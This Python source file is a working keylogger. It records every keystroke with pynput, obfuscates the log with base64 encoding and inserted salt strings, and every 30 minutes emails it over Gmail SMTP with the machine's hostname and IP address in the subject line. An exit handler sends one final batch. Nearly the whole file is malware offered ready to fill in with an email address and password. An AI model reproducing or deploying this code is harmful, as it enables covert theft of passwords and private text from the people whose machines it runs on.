from pynput.keyboard import Key, Listener
from datetime import datetime
from base64 import b64encode
from Mail import MailSender
from itertools import chain
from threading import Event
import logging
import atexit
import socket
import Timer

log_dir = ""
keyStrokes = []

logging.basicConfig(filename=(log_dir + "key_log.txt"),
                    level=logging.DEBUG, format='%(message)s', filemode='w')


def main():
    write_file()
    send_email()


stop = Event()
timer = Timer.PerpetualTimer(
    func=main,
    time=30,
    time_unit="mins",
    stop_event=stop)
timer.start()


def encode(string):
    string = b64encode(string.encode())
    return string.decode('utf-8')


def add_salts(string):
    salts = ["@@PoC", "ˆaDnIL(", "nSo@rsa2h"]
    size = len(string)
    for s in salts:
        string = string[0:int(size / 2)] + s + string[int(size / 2):size]
    return salts[0] + string + salts[2] + salts[1]


def encrypt(string):
    string = encode(string)
    string = add_salts(string)
    string = zip(string, string[::-1])
    string = chain(*string)
    string = list(string)
    return encode("".join(string))


def write_file():
    global keyStrokes
    logging.info(encrypt("".join(keyStrokes)))
    keyStrokes = []
    return


def send_email():
    sub = socket.gethostname() + " - IP: " \
        + socket.gethostbyname(socket.gethostname())

    mail = MailSender("your_email@gmail.com",
                      "your_password",
                      "your_email@gmail",
                      "smtp.gmail.com:587",
                      "key_log.txt",
                      sub,
                      str(datetime.now())
                      )
    mail.send_email()
    return


def exit_handler():
    write_file()
    send_email()
    stop.set()
    Listener.stop


atexit.register(exit_handler)


def on_press(key):
    global keyStrokes
    keyStrokes.append(str(key))


with Listener(on_press=on_press) as listener:
    listener.join()
